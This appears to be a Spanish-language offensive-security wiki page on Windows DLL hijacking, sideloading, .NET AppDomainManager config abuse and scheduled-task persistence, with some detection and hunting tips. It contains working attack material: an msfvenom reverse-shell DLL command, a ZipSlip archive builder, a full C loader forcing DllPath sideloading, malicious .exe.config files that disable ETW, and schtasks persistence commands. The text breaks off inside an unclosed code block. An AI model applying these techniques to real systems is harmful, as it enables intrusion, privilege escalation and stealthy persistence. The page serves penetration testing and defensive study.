# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Información básica

DLL Hijacking consiste en manipular una aplicación de confianza para que cargue una DLL maliciosa. Este término abarca varias tácticas, como **DLL Spoofing, Injection y Side-Loading**. Se utiliza principalmente para ejecutar código y lograr persistencia y, con menor frecuencia, para escalar privilegios. Aunque aquí nos centramos en la escalada, el método de hijacking es el mismo para distintos objetivos.

### Técnicas comunes

Se emplean varios métodos para realizar DLL hijacking; su eficacia depende de la estrategia de carga de DLL de la aplicación:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: sustituir una DLL legítima por una maliciosa, opcionalmente mediante DLL Proxying para conservar la funcionalidad de la DLL original.
2. **DLL Search Order Hijacking**: colocar la DLL maliciosa en una ruta de búsqueda anterior a la de la legítima y aprovechar el patrón de búsqueda de la aplicación.
3. **Phantom DLL Hijacking**: crear una DLL maliciosa para que una aplicación la cargue creyendo que es una DLL requerida que no existe.
4. **DLL Redirection**: modificar parámetros de búsqueda como `%PATH%` o archivos `.exe.manifest` / `.exe.local` para dirigir la aplicación a la DLL maliciosa.
5. **WinSxS DLL Replacement**: sustituir la DLL legítima por una contraparte maliciosa en el directorio WinSxS, un método que suele asociarse con DLL side-loading.
6. **Relative Path DLL Hijacking**: colocar la DLL maliciosa en un directorio controlado por el usuario junto con la aplicación copiada, de forma similar a las técnicas de Binary Proxy Execution.

Una aplicación también puede implementar su **propio cargador de DLL**. Un proceso con privilegios puede enumerar un directorio secundario, como `Libraries` o `Plugins`, y pasar una DLL seleccionada a un componente auxiliar, sin depender del orden de búsqueda normal de DLL de Windows. Si otra cuenta puede crear archivos en ese directorio concreto, considéralo un indicio que conviene investigar: confirma la identidad del proceso, las ACL efectivas del directorio, la regla de selección de archivos y que exista una operación de carga alcanzable. Que un directorio junto a un ejecutable permita escritura no demuestra que el proceso cargue DLL desde allí.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Post-installation PE import grafting

El side-loading clásico deja intacto el PE de confianza y se aprovecha de la resolución de nombres de DLL. En cambio, **Import grafting** modifica un PE que ya carga el programa de confianza. El atacante añade un descriptor de importación y las entradas asociadas de búsqueda/IAT para una DLL bajo su control. Cuando Windows resuelve esa dependencia de forma recursiva, carga la DLL añadida y ejecuta su código de inicialización dentro del proceso que, por lo demás, es legítimo. Se trata de una modificación de un PE en disco, no de la misma operación que reemplazar en tiempo de ejecución un puntero a una función de la IAT activa con un hook.<sup>[[31]](#references)[[32]](#references)</sup>

El PE modificado puede ser una DLL intermedia del proveedor, en lugar del ejecutable que inicia el usuario o el Programador de tareas. Una cadena reutilizable es:<sup>[[32]](#references)</sup>

1. Copiar el ejecutable legítimo y sus dependencias a un directorio controlado por el atacante.
2. Modificar las estructuras de importación de una dependencia para que hagan referencia a la DLL maliciosa, conservando las exportaciones esperadas y el comportamiento normal de la dependencia.
3. Configurar un inicio automático o una tarea programada para iniciar el ejecutable legítimo. El cargador carga la dependencia alterada y, después, la DLL recién importada. Consulta [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) para enumerar tareas.
4. Evitar realizar tareas costosas en `DllMain`; el cargador observado creó un hilo de trabajo y continuó allí el descifrado por etapas.

Esto difiere de un compromiso de la cadena de suministro del proveedor, ya que el paquete del proveedor está limpio y la modificación de la importación se produce después de la instalación. Clasifica todos los módulos del directorio preparado, no solo el EXE anfitrión: compara las listas de importación y los hashes de las dependencias con una instalación fiable, verifica las firmas e investiga los binarios del proveedor iniciados desde ubicaciones inesperadas con permisos de escritura, como `C:\ProgramData`. Una tarea programada que apunte a un generador de informes de fallos o a un actualizador copiado en un directorio de ese tipo es un punto de partida especialmente útil para la investigación.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

El DLL sideloading clásico no es la única forma de hacer que un proceso de confianza de **.NET Framework** cargue código del atacante. Si el ejecutable de destino es una aplicación **gestionada**, el CLR también consulta un **archivo de configuración de la aplicación** cuyo nombre deriva del ejecutable (por ejemplo, `Setup.exe.config`). Ese archivo puede definir un **AppDomainManager** personalizado. Si la configuración apunta a un ensamblado controlado por el atacante y ubicado junto al EXE, el CLR lo carga **antes de que se ejecute la ruta de código normal de la aplicación** y se ejecuta dentro del proceso de confianza.<sup>[[24]](#references)</sup>

Según el esquema de configuración de .NET Framework de Microsoft, deben estar presentes tanto `<appDomainManagerAssembly>` como `<appDomainManagerType>` para que se use el administrador personalizado.<sup>[[16]](#references)[[17]](#references)</sup>

Configuración mínima:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Administrador mínimo:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Notas prácticas:
- Esta técnica es específica de **.NET Framework**. Depende del análisis de configuración del CLR, no del orden de búsqueda de DLL de Win32.
- El host debe ser realmente un **EXE administrado**. Comprobación rápida: `sigcheck -m target.exe`, `corflags target.exe` o busca el **CLR Runtime Header** en los metadatos PE.
- El nombre del archivo de configuración debe coincidir exactamente con el nombre del ejecutable (`<binary>.config`) y normalmente se encuentra **junto al EXE**.
- Es útil con **binarios firmados de Microsoft o de proveedores** porque el EXE de confianza permanece intacto mientras el ensamblado administrado malicioso se ejecuta en el mismo proceso.
- Si ya tienes un directorio de instalación/actualización con permisos de escritura, el hijacking de AppDomainManager puede usarse como **primera etapa**, seguido del DLL sideloading clásico o de la carga reflectiva en etapas posteriores.

### Tipo AppDomainManager firmado como gadget de archivo de configuración

El hijacking de configuración habitual de AppDomainManager descrito arriba apunta a un ensamblado del atacante. Otra vía de .NET Framework utiliza un **ensamblado firmado**, preparado junto al host o que pueda resolverse de otra manera, cuyo tipo de administrador lee datos auxiliares controlados por el atacante. El atacante sigue necesitando controlar el archivo `.exe.config` adyacente del host administrado y los archivos secundarios; la firma del ensamblado seleccionado no hace que su entrada de configuración sea segura. El mecanismo de configuración forma parte del comportamiento establecido de AppDomainManager, mientras que la cadena que usa el tipo firmado descrita abajo se observó en el análisis de NetamLoader.<sup>[[16]](#references)[[17]](#references)[[35]](#references)</sup>

En esa cadena, la configuración selecciona `Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration` de `Microsoft.HostIntegration.Connectors`. Su inicialización busca `fabric.config` en el directorio de la aplicación. Una entrada `customType` especifica `System.Resources.ResXResourceSet` y proporciona `Resources.resx` como argumento del constructor, lo que permite acceder a un analizador de recursos sin distribuir una DLL de administrador creada por el atacante. Esto requiere que el ensamblado firmado relacionado con AppFabric y las clases de framework indicadas puedan resolverse en el objetivo; no es una propiedad universal de cualquier EXE administrado.<sup>[[35]](#references)</sup> Un AppDomainManager configurado también requiere una aplicación de plena confianza; de lo contrario, el CLR lanza `TypeLoadException`.<sup>[[16]](#references)[[17]](#references)</sup>

```xml
<!-- in <host>.exe.config -->
<configuration>
  <runtime>
    <appDomainManagerType value="Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration" />
    <appDomainManagerAssembly value="Microsoft.HostIntegration.Connectors, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
  </runtime>
</configuration>
```

```xml
<!-- adjacent fabric.config -->
<section name="foo">
  <customType className="System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089(Resources.resx)" />
</section>
```

El contenido de `Resources.resx` es el punto de deserialización, no simplemente un archivo de datos; consulta [RESX to BinaryFormatter and XAML](../../../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml). En la etapa reportada, el cargador de XAML también derivaba su clave AES del hash SHA-256 de la **línea de comandos completa del host en minúsculas** y usaba los primeros 16 bytes del blob decodificado como IV. Por lo tanto, reproducir los archivos con una línea de comandos diferente hace que falle el descifrado antes de que se cargue el siguiente XAML.<sup>[[35]](#references)</sup>

### AppDomainManager como downloader + bootstrap de tarea programada

Un patrón práctico de intrusión consiste en emparejar el EXE administrado de confianza con un `*.config` malicioso y una DLL de AppDomainManager maliciosa que actúa únicamente como un **bootstrapper pequeño**:<sup>[[25]](#references)</sup>

1. El usuario inicia un instalador o actualizador .NET firmado desde una ubicación creíble, como `%USERPROFILE%\Downloads`.
2. El archivo de configuración adyacente hace que el CLR cargue el ensamblado del atacante **antes** de que empiece la lógica legítima de la aplicación.
3. El manager malicioso realiza un **control de ruta** (por ejemplo, solo continúa si el EXE del host se ejecuta desde `Downloads` y solo permite que la segunda etapa se ejecute desde `%LOCALAPPDATA%`).
4. Si la comprobación se supera, descarga el payload real en una ruta en la que el usuario pueda escribir, como `%LOCALAPPDATA%\PerfWatson2.exe`, e instala persistencia con una tarea programada.

Por qué importa esta variante:
- El EXE del host firmado permanece sin cambios, por lo que un análisis de triaje que solo calcule el hash del binario principal puede pasar por alto el compromiso.
- Es común el **anti-analysis basado en rutas**: mover el trío ZIP/EXE/DLL a Desktop, Temp o una ruta de sandbox puede romper la cadena deliberadamente.
- La DLL de AppDomainManager de primera etapa puede ser pequeña y discreta, mientras que el implante real se descarga más tarde.

Ejemplo mínimo de persistencia que suele verse con este patrón:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notas:
- ` /rl highest` significa **el nivel más alto disponible** para ese usuario/sesión; por sí solo no garantiza una escalada a SYSTEM.
- Esta técnica suele clasificarse mejor como **ejecución/persistencia mediante abuso de la configuración de .NET** que como un secuestro clásico del orden de búsqueda por DLL faltante, aunque los operadores suelen encadenar ambas.

Indicadores de detección:
- Ejecutables de .NET firmados iniciados desde **rutas de extracción de ZIP**, `Downloads`, `%TEMP%` u otras carpetas en las que el usuario pueda escribir, con un archivo `<exe>.config` **en la misma carpeta**.
- Nuevas tareas programadas cuya acción apunta a `%LOCALAPPDATA%`, `%APPDATA%` o `Downloads` y cuyos nombres imitan los actualizadores de navegadores o proveedores.
- Procesos de bootstrap administrados de corta duración que descargan inmediatamente otro EXE y luego inician `schtasks.exe`.
- Muestras que finalizan pronto a menos que la ruta del ejecutable coincida con un directorio de perfil de usuario esperado.

### Secuestrar una tarea programada existente para volver a iniciar la cadena de sideload

Para lograr persistencia, no busques únicamente **la creación de una tarea nueva**. Algunos grupos de intrusión esperan a que un instalador legítimo cree una **tarea normal de actualización** y luego **reescriben la acción de la tarea** para que el nombre, el autor y el desencadenador existentes sigan pareciendo conocidos para los defensores.

Flujo de trabajo reutilizable:
1. Instala o ejecuta el software legítimo e identifica la tarea que normalmente crea.
2. Exporta el XML de la tarea y anota los valores actuales de `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Reemplaza solo la acción para que la tarea inicie tu **EXE host de confianza** desde un directorio de preparación en el que el usuario pueda escribir, que luego carga mediante sideload o AppDomain la carga útil real.
4. Vuelve a registrar el mismo nombre de tarea en lugar de crear un artefacto de persistencia nuevo y evidente.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Por qué es más sigiloso:
- El nombre de la tarea puede parecer legítimo (por ejemplo, el de un actualizador de un proveedor).
- El **servicio Task Scheduler** la ejecuta, así que la validación del proceso padre/ancestro suele detectar la cadena de programación esperada en lugar de `explorer.exe`.
- Los equipos de DFIR que solo buscan **nombres de tareas nuevos** pueden pasar por alto una tarea cuyo registro ya existía, pero cuya acción ahora apunta a `%LOCALAPPDATA%`, `%APPDATA%` u otra ruta controlada por el atacante.

Puntos de búsqueda rápidos:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Compara el XML de `C:\Windows\System32\Tasks\*` y los metadatos de `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` con una referencia.
- Genera una alerta cuando una **tarea de actualización que parece ser de un proveedor** se ejecute desde **directorios en los que puede escribir un usuario** o inicie un EXE de .NET con un archivo `*.config` en el mismo directorio.

> [!TIP]
> Para ver una cadena paso a paso que combina la preparación de HTML, configuraciones AES-CTR e implantes de .NET con DLL sideloading, revisa el flujo de trabajo siguiente.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Vincular una etapa cargada mediante sideloading a la línea de comandos del servicio

Una DLL cargada mediante sideloading puede requerir algo más que el nombre esperado del EXE host y de la DLL. Mandiant describió un loader que vincula el descifrado del payload a un argumento de línea de comandos y al nombre de su ejecutable host.<sup>[[33]](#references)</sup> En una cadena posterior respaldada por un servicio, un host legítimo copiado cargaba un `mscoree.dll` vecino, que exportaba `LockClrVersion` y descifraba la etapa incrustada solo después de derivar una clave AES-128 a partir del argumento del servicio y del nombre base del ejecutable host. Cada entrada se truncaba o rellenaba con NUL hasta alcanzar 16 bytes; la clave, byte a byte, era `argument XOR embedded_key XOR executable_basename`, y luego el payload se descifraba con AES-CBC sin padding. Cambiar el nombre del host o iniciarlo sin el argumento esperado cambia la clave e impide descifrar esta etapa, incluso si la DLL sigue cargándose. Al reproducir o analizar esta variante, conserva exactamente el argumento de línea de comandos y el nombre base.<sup>[[34]](#references)</sup>

Esto es una **puerta de control del payload superpuesta al DLL side-loading habitual**, no una nueva regla de orden de búsqueda de DLL ni, por sí sola, una primitiva de escalada de privilegios. El contexto de seguridad del servicio determina el nivel de privilegios resultante. El [flujo de trabajo de C2 mediante problemas/archivos de GitHub](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) documenta por separado el transporte posterior.<sup>[[34]](#references)</sup>

## Encontrar DLL faltantes

La forma más habitual de encontrar DLL faltantes en un sistema es ejecutar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals y **configurar** los **2 filtros siguientes**:

![Técnicas comunes - Encontrar DLL faltantes: La forma más habitual de encontrar DLL faltantes en un sistema es ejecutar procmon de sysinternals y configurar los 2 filtros siguientes](<../../../images/image (961).png>)

![Técnicas comunes - Encontrar DLL faltantes: La forma más habitual de encontrar DLL faltantes en un sistema es ejecutar procmon de sysinternals y configurar los 2 filtros siguientes](<../../../images/image (230).png>)

y mostrar solo **File System Activity**:

![Técnicas comunes - Encontrar DLL faltantes: y mostrar solo File System Activity](<../../../images/image (153).png>)

Si buscas **DLL faltantes en general**, déjalo **ejecutándose** durante algunos **segundos**.\
Si buscas una **DLL faltante dentro de un ejecutable específico**, configura otro filtro, como **"Process Name" "contains" `<exec name>`**, ejecútalo y detén la captura de eventos.<sup>[[9]](#references)</sup>

## Explotar DLL faltantes

Para escalar privilegios, busca una **DLL que un proceso privilegiado intente cargar** desde una ubicación en la que puedas escribir. Esto puede ocurrir cuando controlas un directorio que se busca antes que el directorio que contiene la DLL legítima, o cuando la DLL solicitada no existe y puedes escribir en uno de los directorios de búsqueda.

### Orden de búsqueda de DLL

**En la** [**documentación de Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puedes encontrar cómo se cargan específicamente las DLL.**

Las **aplicaciones de Windows** buscan DLL siguiendo un conjunto de **rutas de búsqueda predefinidas**, en un orden concreto. El problema de DLL hijacking surge cuando una DLL maliciosa se coloca estratégicamente en uno de estos directorios para que se cargue antes que la DLL auténtica. Una forma de evitarlo es asegurarse de que la aplicación use rutas absolutas al hacer referencia a las DLL que necesita.

A continuación, puedes ver el **orden de búsqueda de DLL en sistemas de 32 bits**:

1. El directorio desde el que se cargó la aplicación.
2. El directorio del sistema. Usa la función [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obtener la ruta de este directorio.(_C:\Windows\System32_)
3. El directorio del sistema de 16 bits. No hay ninguna función que obtenga la ruta de este directorio, pero se busca en él. (_C:\Windows\System_)
4. El directorio de Windows. Usa la función [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obtener la ruta de este directorio.
   1. (_C:\Windows_)
5. El directorio actual.
6. Los directorios indicados en la variable de entorno PATH. Ten en cuenta que esto no incluye la ruta por aplicación especificada en la clave del registro **App Paths**. La clave **App Paths** no se usa al calcular la ruta de búsqueda de DLL.

Este es el orden de búsqueda **predeterminado** con **SafeDllSearchMode** habilitado. Cuando está deshabilitado, el directorio actual pasa al segundo lugar. Para deshabilitar esta característica, crea el valor del registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y establécelo en 0 (está habilitado de forma predeterminada).

Si se llama a la función [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) con **LOAD_WITH_ALTERED_SEARCH_PATH**, la búsqueda comienza en el directorio del módulo ejecutable que **LoadLibraryEx** está cargando.

Por último, se puede cargar una DLL mediante una ruta absoluta en lugar de por nombre. En ese caso, Windows busca la propia DLL únicamente en esa ruta; las dependencias solicitadas por nombre siguen el orden de búsqueda aplicable.

Hay otras formas de modificar el orden de búsqueda, pero no las explicaré aquí.

### Encadenar una escritura arbitraria de archivos con un DLL hijack por DLL faltante

**Técnica relacionada:** [cambio de punto de montaje controlado por oplock contra una reparación privilegiada](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Usa los filtros de **ProcMon** (`Process Name` = EXE objetivo, `Path` termina en `.dll`, `Result` = `NAME NOT FOUND`) para recopilar los nombres de DLL que el proceso busca, pero no encuentra.<sup>[[14]](#references)</sup>
2. Si el binario se ejecuta **programado o como servicio**, dejar una DLL con uno de esos nombres en el **directorio de la aplicación** (entrada n.º 1 del orden de búsqueda) hará que se cargue en la siguiente ejecución. En un caso con un escáner de .NET, el proceso buscaba `hostfxr.dll` en `C:\samples\app\` antes de cargar la copia real desde `C:\Program Files\dotnet\fxr\...`.
3. Crea una DLL de payload (por ejemplo, una reverse shell) con cualquier exportación: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Si tu primitiva es una **escritura arbitraria al estilo ZipSlip**, crea un ZIP cuya entrada salga del directorio de extracción para que la DLL termine en la carpeta de la aplicación:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Entrega el archivo en la bandeja de entrada/recurso compartido supervisado; cuando la tarea programada vuelva a iniciar el proceso, este cargará la DLL maliciosa y ejecutará tu código como la cuenta de servicio.

### Forzar el sideloading mediante RTL_USER_PROCESS_PARAMETERS.DllPath

Una forma avanzada de influir de manera determinista en la ruta de búsqueda de DLL de un proceso recién creado consiste en establecer el campo DllPath en RTL_USER_PROCESS_PARAMETERS al crear el proceso mediante las API nativas de ntdll. Al especificar aquí un directorio controlado por el atacante, se puede hacer que un proceso objetivo que resuelva una DLL importada por nombre (sin una ruta absoluta y sin usar los indicadores de carga segura) cargue una DLL maliciosa desde ese directorio.

Idea clave
- Crea los parámetros del proceso con RtlCreateProcessParametersEx y proporciona un DllPath personalizado que apunte a tu carpeta controlada (por ejemplo, el directorio donde está tu dropper/unpacker).
- Crea el proceso con RtlCreateUserProcess. Cuando el binario objetivo resuelva una DLL por nombre, el loader consultará el DllPath proporcionado durante la resolución, lo que permitirá un sideloading fiable incluso si la DLL maliciosa no está en el mismo directorio que el EXE objetivo.

Notas y limitaciones
- Esto afecta al proceso secundario que se está creando; es distinto de SetDllDirectory, que solo afecta al proceso actual.
- El objetivo debe importar o cargar con LoadLibrary una DLL por nombre (sin una ruta absoluta y sin usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs y las rutas absolutas codificadas no se pueden hijackear. Las exportaciones reenviadas y SxS pueden cambiar la precedencia.

Ejemplo mínimo en C (ntdll, cadenas wide, gestión de errores simplificada):

<details>
<summary>Ejemplo completo en C: forzar el sideloading de DLL mediante RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Ejemplo de uso operativo
- Coloca un xmllite.dll malicioso (que exporte las funciones necesarias o haga proxy a la DLL real) en tu directorio DllPath.
- Inicia un binario firmado que, según se sabe, busca xmllite.dll por nombre mediante la técnica anterior. El loader resuelve la importación usando el DllPath proporcionado y hace sideloading de tu DLL.

Se ha observado que esta técnica se usa en entornos reales para impulsar cadenas de sideloading de varias etapas: un launcher inicial deja una DLL auxiliar, que luego inicia un binario firmado por Microsoft y vulnerable a hijacking, con un DllPath personalizado para forzar la carga de la DLL del atacante desde un directorio de staging.<sup>[[6]](#references)</sup>


### AppDomainManager hijacking de .NET mediante `.exe.config`

Para objetivos de **.NET Framework**, se puede hacer sideloading **antes de `Main()`** sin parchear la memoria, aprovechando el archivo **`.exe.config`** adyacente de la aplicación. En lugar de depender únicamente del orden de búsqueda de DLL de Win32, el atacante coloca un EXE legítimo de .NET junto a un archivo de configuración malicioso y uno o más assemblies controlados por el atacante.

Cómo funciona la cadena:<sup>[[15]](#references)[[22]](#references)</sup>
1. Se inicia el EXE anfitrión y el **CLR lee `<exe>.config`**.
2. La configuración establece **`<appDomainManagerAssembly>`** y **`<appDomainManagerType>`** para que el runtime instancie un `AppDomainManager` controlado por el atacante.
3. El manager malicioso obtiene **ejecución antes de `Main()`** dentro del proceso anfitrión de confianza.
4. La misma configuración puede forzar al CLR a resolver primero los assemblies locales (por ejemplo, `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) y puede debilitar la validación/telemetría del runtime sin parchear inline.

Patrón tipo campaña (el anidamiento exacto puede variar según la directiva o la versión del CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Por qué esto es útil:
- **`<probing privatePath="."/>`** mantiene la resolución de assemblies en el directorio de la aplicación, convirtiendo la carpeta en una superficie predecible para sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** ejecutan código del atacante durante la inicialización del CLR, antes de que se ejecute la lógica legítima de la aplicación.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** puede permitir que una aplicación de full-trust cargue assemblies sin firmar o manipulados sin que falle la validación de strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** evita las redirecciones de publisher-policy a assemblies más nuevos.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** hace que la selección del runtime sea más determinista.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** resulta especialmente interesante porque el **CLR desactiva su propia visibilidad de ETW** desde la configuración, en lugar de que el implant parche `EtwEventWrite` en memoria.

Patrón operativo observado en campañas recientes:
- Etapa 1: deja `setup.exe`, `setup.exe.config` y assemblies locales.
- Etapa 2: los copia en una carpeta verosímil de **actualizaciones de AppData**, cambia el nombre del host por algo como `update.exe` y lo vuelve a iniciar mediante una **tarea programada**.
- Etapa 3: verifica el contexto de ejecución (por ejemplo, que el proceso padre esperado sea `svchost.exe` iniciado por Task Scheduler) antes de cargar la DLL/export final del RAT.

Ideas para la búsqueda:
- Ejecutables **.NET** firmados o legítimos que se ejecutan con archivos **`.config`** adyacentes sospechosos en ubicaciones donde los usuarios pueden escribir.
- Archivos `.config` que contengan **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** o **`etwEnable enabled="false"`**.
- Tareas programadas que vuelven a iniciar binarios de actualización renombrados desde **`%LOCALAPPDATA%`** o directorios específicos de la aplicación, como `\bin\update\`.
- Cadenas de procesos padre/hijo en las que una tarea programada inicia un host .NET de confianza que inmediatamente carga assemblies que no son del proveedor desde su propio directorio.

#### Excepciones al orden de búsqueda de DLL según la documentación de Windows

La documentación de Windows señala ciertas excepciones al orden de búsqueda estándar de DLL:

- Cuando se encuentra una **DLL que comparte su nombre con otra ya cargada en memoria**, el sistema omite la búsqueda habitual. En su lugar, comprueba si hay una redirección y un manifiesto antes de recurrir a la DLL ya cargada en memoria. **En este escenario, el sistema no busca la DLL**.
- Si la DLL se reconoce como una **known DLL** para la versión actual de Windows, el sistema utiliza su versión de la known DLL, junto con cualquiera de sus DLL dependientes, **omitiendo el proceso de búsqueda**. La clave de registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene una lista de estas known DLLs.
- Si una **DLL tiene dependencias**, la búsqueda de esas DLL dependientes se realiza como si se hubieran indicado únicamente mediante sus **nombres de módulo**, independientemente de si la DLL inicial se identificó mediante una ruta completa.

### Escalar privilegios

**Requisitos**:

- Identificar un proceso que se ejecute o vaya a ejecutarse con **privilegios diferentes** (movimiento horizontal o lateral) y al que **le falte una DLL**.
- Asegurarse de tener **acceso de escritura** en cualquier **directorio** en el que se vaya a **buscar la DLL**. Esta ubicación podría ser el directorio del ejecutable o un directorio dentro de la ruta del sistema.

Estos requisitos no suelen darse por defecto: los ejecutables privilegiados normalmente no tienen dependencias de DLL ausentes, y los usuarios estándar normalmente no pueden escribir en directorios de la ruta de búsqueda del sistema. Aun así, los entornos mal configurados pueden presentar ambas condiciones.\
Si se cumplen los requisitos, consulta el proyecto [UACME](https://github.com/hfiref0x/UACME). Aunque su objetivo principal es el UAC bypass, contiene PoCs de DLL hijacking para versiones específicas de Windows que a menudo pueden adaptarse al directorio escribible que hayas encontrado.

Ten en cuenta que puedes **comprobar tus permisos en una carpeta** con:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Y **comprueba los permisos de todas las carpetas dentro de PATH**:

```bash
